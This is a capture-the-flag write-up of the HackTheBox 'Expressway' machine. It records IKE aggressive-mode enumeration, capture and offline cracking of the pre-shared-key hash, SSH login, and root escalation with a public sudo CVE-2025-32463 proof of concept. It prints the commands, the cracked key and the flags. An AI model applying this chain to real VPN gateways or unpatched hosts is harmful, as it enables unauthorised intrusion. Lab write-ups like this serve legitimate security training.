---
title: ExpressWay
draft: false
tags:
  - linux
  - easy
  - session9
  - port500
  - CVE-2025-32463
---

# Description
- I am learning CRTO. I try HTB lab of session9. The blog for first lab of HTB session9
- Target: 10.129.136.16
# User flag
## nmap
```bash
TCP Scan port:
Not shown: 9999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
→ I searched vulner of version ssh but this have not vul
- Then i stucked . I will search new way to exploit → I knowed TCP scan and UDP scan is different → `nmap -sU -sV 10.129.136.16`
```bash
Not shown: 996 closed udp ports (port-unreach)
PORT     STATE         SERVICE   VERSION
68/udp   open|filtered dhcpc
69/udp   open          tftp      Netkit tftpd or atftpd
500/udp  open          isakmp?
4500/udp open|filtered nat-t-ike
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port500-UDP:V=7.95%I=7%D=10/5%Time=68E23881%P=x86_64-pc-linux-gnu%r(IKE
SF:_MAIN_MODE,70,"\0\x11\"3DUfwU\x8bL\xd3Uf\x10Z\x01\x10\x02\0\0\0\0\0\0\0
SF:\0p\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\x20\x01\x0
SF:1\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x01\x80\x0b\0
SF:\x01\x80\x0c\0\x01\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\0\0\0\x14\xaf\xca
SF:\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0")%r(IPSEC_START,9C,"1'\xfc\x
SF:b08\x10\x9e\x89&\x92\xca&a\xf8\x16Z\x01\x10\x02\0\0\0\0\0\0\0\0\x9c\r\0
SF:\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\x20\x01\x01\0\0\x
SF:80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x03\x80\x0b\0\x01\x8
SF:0\x0c\x0e\x10\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\r\0\0\x14\xaf\xca\xd7\
SF:x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0\r\0\0\x18@H\xb7\xd5n\xbc\xe8\x85%
SF:\xe7\xde\x7f\0\xd6\xc2\xd3\x80\0\0\0\0\0\0\x14\x90\xcb\x80\x91>\xbbin\x
SF:08c\x81\xb5\xecB{\x1f");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
→ We have port 500 and 4500 → this is ISAmkp for vpn IPSec site to site
→ Attack this → using `ike-scan` tool
## port 500 pentest (ike-scan tool)
Checklist to pentest for port 500 UDP
- [ ] Scan port 500 UDP open → isakmp service
- [ ] Scan fingerprint service : `ike-scan -M <ip>`
- [ ] Check Ciphersuites out date (DES, 3DES, MD5)
- [ ] Check Aggressive mode (IKEv1) avaliable → can using `ike-scan -A <ip>` → get userleak → `ike-scan` get `psk hash`
Ok! Let’s pentest!
```bash
└─$ sudo ike-scan -M 10.129.135.16
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.135.16   Main Mode Handshake returned
        HDR=(CKY-R=fef8ec0fbe84453e)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```
→ IKEv1, Ciphersuites weak (3DES, hash SHA1) → Let’s scan with Aggressive mode
```bash
└─$ sudo ike-scan -A -Ppsk.txt 10.129.135.16 
[sudo] password for kali: 
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.135.16   Aggressive Mode Handshake returned HDR=(CKY-R=7bbf0d45bc67864e) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.113 seconds (8.83 hosts/sec).  1 returned handshake; 0 returned notify
                                                                                                                     
```
→ We have identication leak is : `ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)`
→ Next. We attack get `pskhash` to crack offline by ike-scan
```bash
└─$ sudo ike-scan -M --aggressive 10.129.135.16 -n ike@expressway.htb --pskcrack=hash.txt
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.135.16   Aggressive Mode Handshake returned
        HDR=(CKY-R=5868446386d949af)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.121 seconds (8.28 hosts/sec).  1 returned handshake; 0 returned notify

└─$ cat hash.txt                                                                                                  
491dcf1520ae2cc4f48df8a7e7046e36d97ae61e5caaaaf9c1efafce7dad57a4484ba48bb16fa4e6eb62cd93eb0f115b476ee5aa5613cc5bd9360931240665e3fad1bf7931b69dc3db2d3f90b4807f1931183194976e44c4a1d66feb8633745e520cac934f37dae792c8e6357131afe2d51403d2a6daef599d01dee43370f3b5:2225a3f042834ce701b65c5c80744ca756cdbe50dc5d0035cbd185c8f6a162bd4ed8ec3a4cf2b858d2c5a976b8f1d091263b1746d4054edabca8020dd67cfed1d5022402ee39689987f2e2d85a96dc5b15217a91b03eb02b17df1df80da3e5f73febcafaf1730c0414490828f6631bdc521a19ef06b1b8b1e2a0ba20bf8f8013:5868446386d949af:48d1b32659f88286:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:af0d713dfe34e3f325d94fad89dc83f2c57a1480:772eeb2d6a6e906ad1414b37c0274504144beba65637f86d6c2e3afd30febdb0:37afdfe07f216d179de772ce4cb14742ac1b5510

```
Next → We crack psk by `psk-crack `tool with wordlist `rockyou.txt`
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway-easy-linux/CVE-2024-6387]
└─$ sudo psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 37afdfe07f216d179de772ce4cb14742ac1b5510
Ending psk-crack: 8045040 iterations in 8.842 seconds (909816.44 iterations/sec)
```
OK Pwned!!!!
Let’s try login ssh
```bash
└──╼ [★]$ ssh ike@10.129.135.16
ike@10.129.135.16's password: 
Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 5 16:01:38 2025 from 10.10.14.21
ike@expressway:~$ ls
user.txt
ike@expressway:~$ cat user.txt 
456fd1de8c30fc864b54d26d2558e30e

```
# Root flag
## Recon
```bash
ike@expressway:~$ uname -a
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64 GNU/Linux
ike@expressway:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:cc:44 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    altname enx005056b9cc44
    inet 10.129.135.16/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2320sec preferred_lft 2320sec
    inet6 dead:beef::250:56ff:feb9:cc44/64 scope global dynamic mngtmpaddr proto kernel_ra 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:feb9:cc44/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
ike@expressway:~$ ss -tulpn
Netid              State               Recv-Q              Send-Q                           Local Address:Port                            Peer Address:Port              Process              
udp                UNCONN              4480                0                                      0.0.0.0:68                                   0.0.0.0:*                                      
udp                UNCONN              0                   0                                      0.0.0.0:68                                   0.0.0.0:*                                      
udp                UNCONN              0                   0                                      0.0.0.0:69                                   0.0.0.0:*                                      
udp                UNCONN              0                   0                                      0.0.0.0:4500                                 0.0.0.0:*                                      
udp                UNCONN              0                   0                                      0.0.0.0:500                                  0.0.0.0:*                                      
udp                UNCONN              0                   0                                         [::]:69                                      [::]:*                                      
udp                UNCONN              0                   0                                         [::]:4500                                    [::]:*                                      
udp                UNCONN              0                   0                                         [::]:500                                     [::]:*                                      
tcp                LISTEN              0                   20                                   127.0.0.1:25                                   0.0.0.0:*                                      
tcp                LISTEN              0                   128                                    0.0.0.0:22                                   0.0.0.0:*                                      
tcp                LISTEN              0                   20                                       [::1]:25                                      [::]:*                                      
tcp                LISTEN              0                   128                                       [::]:22                                      [::]:*  
```

```bash
ike@expressway:~$ which sudo
/usr/local/bin/sudo
ike@expressway:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

Password: 
Sorry, user ike may not run sudo on expressway.

```
```bash
ike@expressway:~$ ping -c 3 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2040ms

ike@expressway:~$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17

```
→ VM not have internet, sudo -l failed , sudo -V (Sudo version 1.9.17) , /ect/passwd (have all lot of user have www-data)
OK ! we have some infor of VM → search GG CVE for sudo
![[Pasted image 20251005232816.png]]→ Woa !! This sudo’s version have Critical CVE (PoC exploited)
Esasy way !!! I have downloaded PoC from github: [https://github.com/MohamedKarrab/CVE-2025-32463](https://github.com/MohamedKarrab/CVE-2025-32463)
I scp PoC to VM and run
```powershell
┌─[sg-dedivip-1]─[10.10.14.21]─[d3cky@htb-o65gbhiltr]─[~/Desktop]
└──╼ [★]$ scp -r CVE-2025-32463 ike@10.129.135.16:CVE_2025
ike@10.129.135.16's password: 
king.aarch64.b64                              100%   28KB   4.4MB/s   00:00    
king.armv7l.b64                               100%   26KB   6.5MB/s   00:00    
king.x86_64.b64                               100%   31KB   8.2MB/s   00:00    
king.i386.b64                                 100%   29KB   7.8MB/s   00:00    
king.riscv64.b64                              100% 9696     3.0MB/s   00:00    
README.md                                     100% 1588   916.1KB/s   00:00    
mkall-dynamic.sh                              100%  989   497.9KB/s   00:00    
.gitignore                                    100% 4484     2.1MB/s   00:00    
get_root.py                                   100% 2496     1.2MB/s   00:00    
config                                        100%  272   160.2KB/s   00:00    
HEAD                                          100%   21     9.4KB/s   00:00    
HEAD                                          100%   30    17.5KB/s   00:00    
main                                          100%   41    20.9KB/s   00:00    
packed-refs                                   100%  112    48.8KB/s   00:00    
pre-push.sample                               100% 1374   810.9KB/s   00:00    
pre-applypatch.sample                         100%  424   175.8KB/s   00:00    
pre-merge-commit.sample                       100%  416   214.4KB/s   00:00    
push-to-checkout.sample                       100% 2783     1.6MB/s   00:00    
prepare-commit-msg.sample                     100% 1492   791.5KB/s   00:00    
post-update.sample                            100%  189    84.1KB/s   00:00    
pre-receive.sample                            100%  544   267.0KB/s   00:00    
commit-msg.sample                             100%  896   466.6KB/s   00:00    
fsmonitor-watchman.sample                     100% 4726     2.0MB/s   00:00    
applypatch-msg.sample                         100%  478   254.4KB/s   00:00    
pre-rebase.sample                             100% 4898     2.1MB/s   00:00    
pre-commit.sample                             100% 1643   655.9KB/s   00:00    
update.sample                                 100% 3650     1.7MB/s   00:00    
pack-8b00f2db0baa0a1d8579d5402a389b994fa01c24 100% 2612     1.2MB/s   00:00    
pack-8b00f2db0baa0a1d8579d5402a389b994fa01c24 100%   69KB  12.3MB/s   00:00    
description                                   100%   73    41.0KB/s   00:00    
index                                         100% 1565   696.6KB/s   00:00    
HEAD                                          100%  199   104.0KB/s   00:00    
HEAD                                          100%  199    97.4KB/s   00:00    
main                                          100%  199    87.8KB/s   00:00    
exclude                                       100%  240   119.5KB/s   00:00    
king.aarch64.b64                              100%   91KB  12.6MB/s   00:00    
king.armv7l.b64                               100%   89KB  18.1MB/s   00:00    
king.x86_64.b64                               100%   20KB   4.7MB/s   00:00    
king.i386.b64                                 100%   19KB   7.8MB/s   00:00    
king.riscv64.b64                              100%   10KB   4.4MB/s   00:00    
get_root.sh                                   100% 1748   991.9KB/s   00:00    
LICENSE     
```
```bash
ike@expressway:~/CVE_2025$ ls
archs-dynamic  get_root.py  LICENSE           README.md
archs-static   get_root.sh  mkall-dynamic.sh
ike@expressway:~/CVE_2025$ chmod +x get_root.sh 
ike@expressway:~/CVE_2025$ ./get_root.sh 
[*] Detected architecture: x86_64
[*] Launching sudo with archs-dynamic payload …
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)

```
- Get flag
```powershell
root@expressway:/root# ls
root.txt
root@expressway:/root# cat root.txt 
7567ba36827639f33ee7b5ec8e6b8aec
root@expressway:/root# 

```